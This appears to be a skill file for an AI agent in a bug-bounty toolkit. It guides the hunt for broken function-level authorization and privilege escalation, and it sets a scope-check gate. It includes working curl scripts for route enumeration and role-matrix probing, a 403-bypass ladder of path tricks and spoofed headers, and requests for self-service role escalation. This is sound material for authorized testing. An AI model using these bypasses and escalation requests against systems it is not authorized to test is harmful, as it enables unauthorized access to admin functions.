---
name: zp-authz
description: ZeroProtocol hunter for broken function-level authorization and privilege escalation. Use when a route returns 401 or 403, when testing whether a low-privilege user can reach admin functionality, when hunting BFLA, forced browsing, role escalation, or missing middleware on an endpoint, when a 403 needs bypassing, or when checking whether authorization is enforced only in the client. Distinguishes authentication gaps from authorization gaps, because they are different reports.
---

# zp-authz - who is allowed to call this

**Phase:** 5 | **Gate:** **active.** `zp-scope check <target>` must exit 0. Exit 1 refuse ·
3 stop · 4 stop.

`zp-idor` asks *whose object*. This skill asks *whose function*. A user calling
`POST /api/admin/users` successfully is broken function-level authorization, and it does not
matter whose object is named in the body.

A `403` is the most under-exploited response code in bug bounty. It is the server confirming
the route exists and that it thinks you should not have it.

---

## Procedure

**1. Build the role matrix before probing.** Every cell is a test.

| | anonymous | user A | user B | elevated (if you can get one) |
|---|---|---|---|---|
| public route | expect 200 | 200 | 200 | 200 |
| user route | expect 401 | 200 | 200 | 200 |
| other-user route | 401 | **403 expected** | 200 | 200 |
| admin route | 401 | **403 expected** | 403 | 200 |

Anything that returns 200 where the table says 403 or 401 is the finding. Test every cell -
the gaps are rarely where you expect.

**2. Enumerate the privileged surface.** You are looking for routes the UI never shows your
role.

```bash
# from the bundle - the SPA ships the admin routes even to non-admins
grep -ohE '"/(admin|internal|manage|staff|console|backoffice|su|impersonate)[a-zA-Z0-9/_{}-]*"' js/*.js \
  | tr -d '"' | sort -u > authz-candidates.txt
grep -ohE '"/api/v[0-9]+/[a-zA-Z0-9/_{}-]+"' js/*.js | tr -d '"' | sort -u >> authz-candidates.txt
# and from the spec, if there is one
curl -sk "https://$H/openapi.json" | jq -r '.paths | keys[]' >> authz-candidates.txt
```

**3. Run the matrix.**

```bash
while read -r p; do
  a=$(curl -sk -o /dev/null -w '%{http_code}' "https://$H$p" -H "Authorization: Bearer $TOK_A")
  n=$(curl -sk -o /dev/null -w '%{http_code}' "https://$H$p")
  printf '%-48s user=%s anon=%s\n' "$p" "$a" "$n"
done < authz-candidates.txt | tee authz-matrix.txt
awk '$2=="user=200"' authz-matrix.txt    # a normal user reaching an admin route
awk '$3=="anon=200"' authz-matrix.txt    # no authentication at all
```

**4. Sweep the verbs.** Middleware is frequently attached to `GET` and forgotten on the rest.

```bash
for M in GET POST PUT PATCH DELETE OPTIONS HEAD TRACE; do
  printf '%-8s ' "$M"
  curl -sk -X "$M" "https://$H/api/admin/users" -H "Authorization: Bearer $TOK_A" \
    -H 'Content-Type: application/json' -d '{}' -o /dev/null -w '%{http_code}\n'
done
```

**5. The 403 bypass ladder.** Work through it; each rung is a different misconfiguration.

```
path case          /Admin/  /ADMIN/               framework route matching vs proxy ACL
path tricks        /admin/. /admin//  /./admin/  /admin%2f  /admin/..;/  /admin..;/
                   /admin;/  /admin/~  /admin#  /admin?  /%2e/admin
extension          /admin.json  /admin.css  /admin/  (trailing slash)
encoding           /%61dmin  /%2561dmin (double)  unicode dotless forms
method override    X-HTTP-Method-Override: GET   _method=GET   X-Method-Override
URL override       X-Original-URL: /admin   X-Rewrite-URL: /admin   (nginx/IIS front ends)
source spoof       X-Forwarded-For: 127.0.0.1   X-Real-IP: 127.0.0.1   X-Client-IP
                   X-Forwarded-Host: localhost   X-Originating-IP   Via
protocol           HTTP/1.0 vs HTTP/2, absolute-URI request line
role headers       X-User-Role: admin   X-Is-Admin: true   X-Tenant-Id: <other>
```

`X-Original-URL` and `X-Rewrite-URL` deserve their own mention: when a reverse proxy enforces
the ACL on the front-end path while the app routes on the header, you walk straight past it.

```bash
curl -sk "https://$H/" -H "X-Original-URL: /admin/users" -H "Authorization: Bearer $TOK_A" -o /dev/null -w '%{http_code}\n'
curl -sk "https://$H/anything" -H "X-Rewrite-URL: /admin/users" -o /dev/null -w '%{http_code}\n'
```

**6. Client-side-only authorization.** Very common, very reportable.

```bash
# the UI hides the button; does the API care?
curl -sk -X POST "https://$H/api/users/$UID_A/role" -H "Authorization: Bearer $TOK_A" \
  -H 'Content-Type: application/json' -d '{"role":"admin"}'
curl -sk "https://$H/api/users/$UID_A" -H "Authorization: Bearer $TOK_A" | jq .role   # did it stick?
```

Also look for a response that *contains* privileged data and lets the client decide whether to
render it - `{"user":{...},"isAdmin":false,"adminPanel":{...}}` has already leaked.

**7. Role and tenant escalation paths.**

```
invite yourself to another org        POST /api/orgs/<B_ORG>/invites
change your own role                  PATCH /api/members/<UID_A> {"role":"owner"}
accept a stale//reused invite token    replay an invite already used
tenant id in a header or body         X-Tenant-Id: <B_TENANT>, {"tenant_id": "<B>"}
impersonation endpoints               /admin/impersonate/<uid>, /su/<uid>, ?as_user=
webhook/API-key scoping               create a key as A, use it against B's resources
second-order                          a pending admin action your input reaches later
```

**8. Test the state transitions, not just the endpoints.** Business-logic authorization lives in
sequence: can you approve your own expense, skip the payment step, re-submit an already-approved
request, or move an object to a state the UI does not offer? Walk the flow, then walk it out of
order.

---

## Confirm or kill

| Situation | Verdict |
|---|---|
| user token reaches an admin function, and it takes effect | **confirmed BFLA.** High to Critical |
| anonymous reaches an authenticated function | **missing authentication** - report as that, it is more severe |
| 403 bypassed by a header or path trick, with real functionality behind it | confirmed. Show the working action, not just the 200 |
| 200 with an empty body after a bypass | probably a router quirk, not access. Prove an effect |
| admin route returns 200 but renders "access denied" in the body | not a finding. Read the body |
| role change accepted (200) but not persisted | not a finding. Always read the object back |
| you escalated using an admin credential you found | that is not escalation, that is using a leaked credential. Report the leak |
| the "admin" panel is documented as customer-accessible | killed. Read the docs |
| OPTIONS/HEAD returns 200 on an admin route | informational only - existence disclosure |
| privileged data present in a user-facing response | **confirmed leak** even if the UI hides it |

**The distinction that changes the report:** no session required -> missing authentication;
valid session, wrong privilege -> broken authorization. Triagers score them differently and
mislabelling reads as carelessness.

---

## High-value patterns

- **`/api/admin/*` reachable with a user token** - the canonical BFLA, and it is still everywhere.
- **`X-Original-URL` / `X-Rewrite-URL`** against a proxy-enforced ACL.
- **Self-service role escalation** - `PATCH` your own membership to `owner`.
- **Cross-tenant invite or member endpoints** - add yourself to another organization.
- **An API key created at user scope that works at org scope** - very common in B2B SaaS.
- **Impersonation endpoints** left reachable - instant full ATO.
- **State-machine skips** - approve your own request, or reach a paid feature without paying.
- **A user endpoint returning the admin fields** and relying on the client to hide them.

---

## Pitfalls

- **Treating 403 as a dead end.** It is the best starting point in this skill.
- **Not reading the response body** after a "successful" bypass. 200 plus "access denied" is nothing.
- **Not reading the object back** after a write. A 200 that did not persist is not a finding.
- **Confusing missing authentication with broken authorization.**
- **Testing only `GET`.**
- **Using a found admin credential** and calling it privilege escalation.
- **Performing a real destructive admin action** to prove access - delete a *user you created*, never a real one, and prefer a read-only privileged call as proof.
- **Reporting an intended permission** without checking the product's role documentation.
- **Chaining nothing.** A 403 bypass on a route that does nothing interesting is a weak report; find the privileged action behind it.

---

## Hand off to

Confirmed -> `zp-triage`, `zp-report`. Object-level gaps -> `zp-idor`.
Token-level flaws -> `zp-jwt-oauth`. Admin API surface -> `zp-api`, `zp-graphql`.
A privileged endpoint that fetches URLs -> `zp-ssrf`. Client-only checks found in the bundle ->
`zp-js-secrets`. Source available -> `zp-code-audit` for every route missing the middleware.
